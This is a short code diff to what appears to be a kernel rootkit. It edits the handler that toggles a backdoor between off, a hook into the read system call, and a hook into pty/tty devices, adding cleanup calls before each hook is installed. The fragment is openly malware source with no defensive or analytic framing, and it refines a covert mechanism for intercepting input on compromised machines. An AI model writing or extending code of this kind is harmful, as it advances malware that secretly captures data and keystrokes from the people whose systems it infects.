@@ -117,10 +117,12 @@ handle_togglebd(unsigned long arg)
         rootkit.backdoor = BD_OFF;
         msg = "off";
     } else if (sarg < 0) {
+        unbackdoor();
         backdoor_read();
         rootkit.backdoor = BD_READ;
         msg = "hooked into `read`";
     } else if (sarg > 0) {
+        unbackdoor();
         backdoor_tty();
         rootkit.backdoor = BD_TTY;
         msg = "hooked into `{p,t}ty`";
